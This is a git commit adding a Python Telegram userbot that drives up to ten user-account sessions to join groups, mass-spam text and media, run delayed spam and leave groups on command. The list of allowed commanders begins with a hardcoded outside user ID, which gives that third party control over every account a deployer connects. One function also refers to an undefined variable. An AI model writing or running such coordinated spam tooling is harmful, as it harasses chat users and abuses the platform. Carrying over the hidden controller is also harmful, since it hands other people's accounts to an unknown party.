8fe511881d091beacb6bc0696a05ca35d0c2baa2
Pranavxd22 <101984134+Pranavxd22@users.noreply.github.com>
2022-03-27 07:09:30 +0530

    Create  Cobra.py

---
+++ Cobra.py
@@ -0,0 +1,502 @@
+
+import asyncio
+import os
+import random
+import sys
+from datetime import datetime
+
+import telethon.utils
+from telethon import TelegramClient, events
+from telethon.errors import (
+    ChannelInvalidError,
+    ChannelPrivateError,
+    ChannelPublicGroupNaError,
+)
+from telethon.sessions import StringSession
+from telethon.tl import functions, types
+from telethon.tl.functions.channels import GetFullChannelRequest, LeaveChannelRequest
+from telethon.tl.functions.messages import GetFullChatRequest, ImportChatInviteRequest
+
+from Config import (
+    API_HASH,
+    API_ID,
+    STRING,
+    STRING2,
+    STRING3,
+    STRING4,
+    STRING5,
+    STRING6,
+    STRING7,
+    STRING8,
+    STRING9,
+    STRING10,
+    SUDO,
+)
+from Utils import RAID, RRAID
+
+a = API_ID
+b = API_HASH
+smex = STRING
+smexx = STRING2
+smexxx = STRING3
+smexxxx = STRING4
+smexxxxx = STRING5
+sixth = STRING6
+seven = STRING7
+eight = STRING8
+ninth = STRING9
+tenth = STRING10
+
+
+idk = ""
+ydk = ""
+wdk = ""
+sdk = ""
+hdk = ""
+adk = ""
+bdk = ""
+cdk = ""
+edk = ""
+ddk = ""
+
+
+que = {}
+
+SMEX_USERS = [5256160497]
+for x in SUDO:
+    SMEX_USERS.append(x)
+
+
+async def start_Ustad():
+    global idk
+    global ydk
+    global wdk
+    global sdk
+    global hdk
+    global adk
+    global bdk
+    global cdk
+    global ddk
+    global edk
+    if smex:
+        session_name = str(smex)
+        print("String 1 Found")
+        idk = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 1")
+            await idk.start()
+            botme = await idk.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            SMEX_USERS.append(botid)
+        except Exception as e:
+            idk = "smex"
+            print(e)
+    else:
+        print("Session 1 not Found")
+        session_name = "startup"
+        idk = TelegramClient(session_name, a, b)
+        try:
+            await idk.start()
+        except Exception:
+            pass
+
+    if smexx:
+        session_name = str(smexx)
+        print("String 2 Found")
+        ydk = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 2")
+            await ydk.start()
+            botme = await ydk.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            SMEX_USERS.append(botid)
+        except Exception as e:
+            print(e)
+    else:
+        print("Session 2 not Found")
+        session_name = "startup"
+        ydk = TelegramClient(session_name, a, b)
+        try:
+            await ydk.start()
+        except Exception:
+            pass
+
+    if smexxx:
+        session_name = str(smexxx)
+        print("String 3 Found")
+        wdk = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 3")
+            await wdk.start()
+            botme = await wdk.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            SMEX_USERS.append(botid)
+        except Exception as e:
+            print(e)
+    else:
+        print("Session 3 not Found")
+        session_name = "startup"
+        wdk = TelegramClient(session_name, a, b)
+        try:
+            await wdk.start()
+        except Exception:
+            pass
+
+    if smexxxx:
+        session_name = str(smexxxx)
+        print("String 4 Found")
+        hdk = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 4")
+            await hdk.start()
+            botme = await hdk.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            SMEX_USERS.append(botid)
+        except Exception as e:
+            print(e)
+    else:
+        print("Session 4 not Found")
+        session_name = "startup"
+        hdk = TelegramClient(session_name, a, b)
+        try:
+            await hdk.start()
+        except Exception:
+            pass
+
+    if smexxxxx:
+        session_name = str(smexxxxx)
+        print("String 5 Found")
+        sdk = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 5")
+            await sdk.start()
+            botme = await sdk.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            SMEX_USERS.append(botid)
+        except Exception as e:
+            print(e)
+    else:
+        print("Session 5 not Found")
+        session_name = "startup"
+        sdk = TelegramClient(session_name, a, b)
+        try:
+            await sdk.start()
+        except Exception:
+            pass
+
+    if sixth:
+        session_name = str(sixth)
+        print("String 6 Found")
+        adk = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 6")
+            await adk.start()
+            botme = await adk.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            SMEX_USERS.append(botid)
+        except Exception as e:
+            print(e)
+    else:
+        print("Session 6 not Found")
+        session_name = "startup"
+        adk = TelegramClient(session_name, a, b)
+        try:
+            await adk.start()
+        except Exception:
+            pass
+
+    if seven:
+        session_name = str(seven)
+        print("String 7 Found")
+        bdk = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 7")
+            await bdk.start()
+            botme = await bdk.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            SMEX_USERS.append(botid)
+        except Exception as e:
+            print(e)
+    else:
+        print("Session 7 not Found")
+        session_name = "startup"
+        bdk = TelegramClient(session_name, a, b)
+        try:
+            await bdk.start()
+        except Exception:
+            pass
+
+    if eight:
+        session_name = str(eight)
+        print("String 8 Found")
+        cdk = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 8")
+            await cdk.start()
+            botme = await cdk.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            SMEX_USERS.append(botid)
+        except Exception as e:
+            print(e)
+    else:
+        print("Session 8 not Found")
+        session_name = "startup"
+        cdk = TelegramClient(session_name, a, b)
+        try:
+            await cdk.start()
+        except Exception:
+            pass
+
+    if ninth:
+        session_name = str(ninth)
+        print("String 9 Found")
+        ddk = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 9")
+            await ddk.start()
+            botme = await ddk.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            SMEX_USERS.append(botid)
+        except Exception as e:
+            print(e)
+    else:
+        print("Session 9 not Found")
+        session_name = "startup"
+        ddk = TelegramClient(session_name, a, b)
+        try:
+            await ddk.start()
+        except Exception:
+            pass
+
+    if tenth:
+        session_name = str(tenth)
+        print("String 10 Found")
+        edk = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 10")
+            await edk.start()
+            botme = await edk.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            SMEX_USERS.append(botid)
+        except Exception as e:
+            print(e)
+    else:
+        print("Session 10 not Found")
+        session_name = "startup"
+        edk = TelegramClient(session_name, a, b)
+        try:
+            await edk.start()
+        except Exception:
+            pass
+
+
+loop = asyncio.get_event_loop()
+loop.run_until_complete(start_Ustad())
+
+
+async def gifspam(e, smex):
+    try:
+        await e.client(
+            functions.messages.SaveGifRequest(
+                id=types.InputDocument(
+                    id=sandy.media.document.id,
+                    access_hash=smex.media.document.access_hash,
+                    file_reference=smex.media.document.file_reference,
+                ),
+                unsave=True,
+            )
+        )
+    except Exception:
+        pass
+
+
+@idk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+@ydk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+@wdk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+@hdk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+@sdk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+@adk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+@bdk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+@cdk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+@edk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+@ddk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
+async def _(e):
+    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.join <Public Channel or Group Link/Username>"
+    if e.sender_id in SMEX_USERS:
+        Ustad = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
+        if len(e.text) > 6:
+            bc = Ustad[0]
+            text = "Joining..."
+            event = await e.reply(text, parse_mode=None, link_preview=None)
+            try:
+                await e.client(functions.channels.JoinChannelRequest(channel=bc))
+                await event.edit("ᴊᴀ ʀᴀʜᴀ ɢʜᴀɴᴅ ᴍᴀʀɴᴇ ")
+            except Exception as e:
+                await event.edit(str(e))
+        else:
+            await e.reply(usage, parse_mode=None, link_preview=None)
+
+
+@idk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+@ydk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+@wdk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+@hdk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+@sdk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+@adk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+@bdk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+@cdk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+@edk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+@ddk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
+async def _(e):
+    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.pjoin <Private Channel or Group's access hash>\n\nExample :\nLink = https://t.me/joinchat/HGYs1wvsPUplMmM1\n\n.pjoin HGYs1wvsPUplMmM1"
+    if e.sender_id in SMEX_USERS:
+        Ustad = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
+        if len(e.text) > 7:
+            bc = Ustad[0]
+            text = "Joining...."
+            event = await e.reply(text, parse_mode=None, link_preview=None)
+            try:
+                await e.client(ImportChatInviteRequest(bc))
+                await event.edit("kopche me ghus gaya 🥵")
+            except Exception as e:
+                await event.edit(str(e))
+        else:
+            await e.reply(usage, parse_mode=None, link_preview=None)
+
+
+@idk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@ydk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@wdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@hdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@sdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@adk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@bdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@cdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@edk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@ddk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))        
+async def _(e):
+    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗟𝗲𝗮𝘃𝗲\n\nCommand:\n\n.leave <Channel or Chat ID>"
+    if e.sender_id in SMEX_USERS:
+        jatt = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
+        if len(e.text) > 7:
+            bc = jatt[0]
+            bc = int(bc)
+            text = "Leaving....."
+            event = await e.reply(text, parse_mode=None, link_preview=None )
+            try:
+                await event.client(LeaveChannelRequest(bc))
+                await event.edit("leaved successfully 😂😆")
+            except Exception as e:
+                await event.edit(str(e))   
+        else:
+            await e.reply(usage, parse_mode=None, link_preview=None )
+
+#--------------------------
+ 
+from telethon.tl.functions.channels import LeaveChannelRequest as leave
+
+@idk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
+@ydk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
+@wdk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
+@hdk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
+@sdk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
+@adk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
+@bdk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
+@cdk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
+@edk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
+@ddk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
+async def f(event):
+    if event.sender_id in SMEX_USERS:
+       async for x in idk.iter_dialogs():
+         if x.is_group:
+           await idk(leave(x.id))           
+
+#------------------------
+
+
+@idk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
+@ydk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
+@wdk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
+@hdk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
+@sdk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
+@adk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
+@bdk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
+@cdk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
+@edk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
+@ddk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
+async def spam(e):
+    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗦𝗽𝗮𝗺\n\nCommand:\n\n.spam <count> <message to spam>\n\n.spam <count> <reply to a message>\n\nCount must be a integer."
+    error = "Spam Module can only be used till 100 count. For bigger spams use BigSpam."
+    if e.sender_id in SMEX_USERS:
+        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
+            return await e.reply(usage, parse_mode=None, link_preview=None)
+        Ustad = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
+        smex = await e.get_reply_message()
+        if len(Ustad) == 2:
+            message = str(Ustad[1])
+            counter = int(Ustad[0])
+            if counter > 100:
+                return await e.reply(error, parse_mode=None, link_preview=None)
+            await asyncio.wait([e.respond(message) for i in range(counter)])
+        elif e.reply_to_msg_id and smex.media:
+            counter = int(Ustad[0])
+            if counter > 100:
+                return await e.reply(error, parse_mode=None, link_preview=None)
+            for _ in range(counter):
+                smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
+                await gifspam(e, smex)
+        elif e.reply_to_msg_id and smex.text:
+            message = smex.text
+            counter = int(Ustad[0])
+            if counter > 100:
+                return await e.reply(error, parse_mode=None, link_preview=None)
+            await asyncio.wait([e.respond(message) for i in range(counter)])
+        else:
+            await e.reply(usage, parse_mode=None, link_preview=None)
+
+
+@idk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
+@ydk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
+@wdk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
+@hdk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
+@sdk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
+@adk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
+@bdk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
+@cdk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
+@edk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
+@ddk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
+async def spam(e):
+    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗗𝗲𝗹𝗮𝘆𝗦𝗽𝗮𝗺\n\nCommand:\n\n.delayspam <sleep time> <count> <message to spam>\n\n.delayspam <sleep time> <count> <reply to a message>\n\nCount and Sleeptime must be a integer."
+    if e.sender_id in SMEX_USERS:
+        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
+            return await e.reply(usage, parse_mode=None, link_preview=None)
+        smex = await e.get_reply_message()
+        Ustad = "".join(e.text.split(maxsplit=1)[1:]).split(" ", 2)
+        Ustadsexy = Ustad[1:]
+        if len(Ustadsexy) == 2:
+            message = str(Ustadsexy[1])
+            counter = int(Ustadsexy[0])
+            sleeptime = float(Ustad[0])
+            for _ in range(counter):
+                async with e.client.action(e.chat_id, "typing"):
+                    if e.reply_to_msg_id:
+                        await smex.reply(message)
+                    else:
+                        await e.client.send_message(e.chat_id, message)
+                    await asyncio.sleep(sleeptime)
+        elif e.reply_to_msg_id and smex.media:
+            counter = int(Ustadsexy[0])
+            sleeptime = float(Ustad[0])
+            for _ in range(counter):
+                async with e.client.action(e.chat_id, "document"):
+                    smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
+                    await gifspam(e, smex)
+                await asyncio.sleep(sleeptime)
+        elif e.reply_to_msg_id and smex.text:
+            message = smex.text
+            counter = int(Ustadsexy[0])
+            sleeptime = float(Ustad[0])
+            for _ in range(counter):
+                async with e.client.action(e.chat_id, "typing"):
+                    await e.client.send_message(e.chat_id, message)
+                    await asyncio.sleep(sleeptime)
